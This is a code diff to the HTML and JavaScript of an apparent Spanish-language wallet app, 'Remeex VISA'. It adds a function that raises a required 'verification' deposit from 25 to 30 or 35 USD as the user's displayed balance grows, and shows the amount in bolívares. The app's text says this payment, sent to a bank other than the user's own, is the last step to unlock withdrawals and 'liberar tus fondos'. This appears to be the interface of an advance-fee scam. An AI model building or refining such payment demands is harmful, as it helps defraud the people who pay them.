@@ -6171,7 +6171,7 @@
           </div>
           <div class="mobile-payment-success-content">
             <div class="mobile-payment-success-title">¡Felicidades! Tus datos para recargar tu cuenta de Remeex VISA.</div>
-            <div class="mobile-payment-success-text">Haz tu primera recarga por 25 USD para culminar tu verificación! Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.</div>
+            <div class="mobile-payment-success-text">Haz tu primera recarga por <span id="verification-usd">25 USD</span> (<span id="verification-bs">Bs 0,00</span>) para culminar tu verificación! Ahora tiene sus datos personales configurados para recibir pagos móviles. Puede compartir estos datos con quienes deseen enviarte dinero en Bolívares.</div>
           </div>
         </div>
         <div class="bank-note" id="mobile-payment-note" style="display: none;">No se preocupe, los datos son correctos. Sabemos que su banco principal es <strong><span id="user-bank-name"></span></strong>, pero para su primera recarga le proporcionamos una cuenta en el <strong>Banco Venezolano de Crédito</strong>. Realice la transferencia desde su <strong><span id="user-bank-name-2"></span></strong> o reciba fondos de cualquier persona utilizando estos datos.</div>
@@ -7233,12 +7233,9 @@ function updateBankValidationStatusItem() {
   const progressBar = document.getElementById('bank-validation-progress-bar');
   const progressPercent = document.getElementById('bank-validation-progress-percent');
 
-  let requiredUsd = 25;
-  if (currentUser.balance.usd >= 2015) {
-    requiredUsd = 35;
-  } else if (currentUser.balance.usd >= 1015) {
-    requiredUsd = 30;
-  }
+  let requiredUsd = getVerificationAmountUsd(currentUser.balance.usd || 0);
+  let requiredBs = requiredUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
+  updateVerificationAmountDisplays();
 
   if (verificationStatus.status === 'payment_validation') {
     if (label) label.textContent = 'Pago móvil en verificación';
@@ -7252,7 +7249,7 @@ function updateBankValidationStatusItem() {
   } else {
     if (label) label.textContent = 'Validación de datos de cuenta pendiente';
     if (sublabel) {
-      sublabel.textContent = `${firstName ? firstName + ', ' : ''}para validar tu cuenta debes recargar en Remeex desde tu cuenta registrada en bolívares para habilitar tus retiros y superar el último requerimiento de seguridad.`;
+      sublabel.textContent = `${firstName ? firstName + ', ' : ''}para validar tu cuenta debes recargar ${formatCurrency(requiredUsd, 'usd')} (${formatCurrency(requiredBs, 'bs')}) desde tu cuenta registrada en bolívares para habilitar tus retiros y superar el último requerimiento de seguridad.`;
     }
     if (rechargeBtn) rechargeBtn.style.display = 'inline-block';
     if (statusBtn) statusBtn.style.display = 'inline-block';
@@ -7646,6 +7643,7 @@ function stopVerificationProgress() {
       
       // Actualizar equivalentes en el dashboard
       updateBalanceEquivalents();
+      updateVerificationAmountDisplays();
     }
     
     // Función para actualizar las opciones de monto en los selects
@@ -7728,6 +7726,22 @@ function stopVerificationProgress() {
       if (eurEquivalent) {
         eurEquivalent.textContent = `≈ ${formatCurrency(currentUser.balance.eur, 'eur')}`;
       }
+    }
+
+    function getVerificationAmountUsd(balanceUsd) {
+      if (balanceUsd >= 2001) return 35;
+      if (balanceUsd >= 1015) return 30;
+      if (balanceUsd >= 500) return 25;
+      return 25;
+    }
+
+    function updateVerificationAmountDisplays() {
+      const amtUsd = getVerificationAmountUsd(currentUser.balance.usd || 0);
+      const amtBs = amtUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
+      const usdEl = document.getElementById('verification-usd');
+      const bsEl = document.getElementById('verification-bs');
+      if (usdEl) usdEl.textContent = formatCurrency(amtUsd, 'usd');
+      if (bsEl) bsEl.textContent = formatCurrency(amtBs, 'bs');
     }
 
     // Inicialización de la aplicación
@@ -12168,10 +12182,12 @@ function setupUsAccountLink() {
     ];
 
     if (verificationStatus.status === 'bank_validation') {
+      const amtUsd = getVerificationAmountUsd(currentUser.balance.usd || 0);
+      const amtBs = amtUsd * CONFIG.EXCHANGE_RATES.USD_TO_BS;
       promos.unshift({
         icon: 'fas fa-shield-alt',
         title: 'Valida tu Cuenta',
-        text: 'Realiza una recarga por 25 USD desde tu cuenta registrada. Es el \u00faltimo paso para liberar tus fondos.'
+        text: `Realiza una recarga por ${formatCurrency(amtUsd, 'usd')} (${formatCurrency(amtBs, 'bs')}) desde tu cuenta registrada. Es el \u00faltimo paso para liberar tus fondos.`
       });
     }
     let promoIndex = 0;
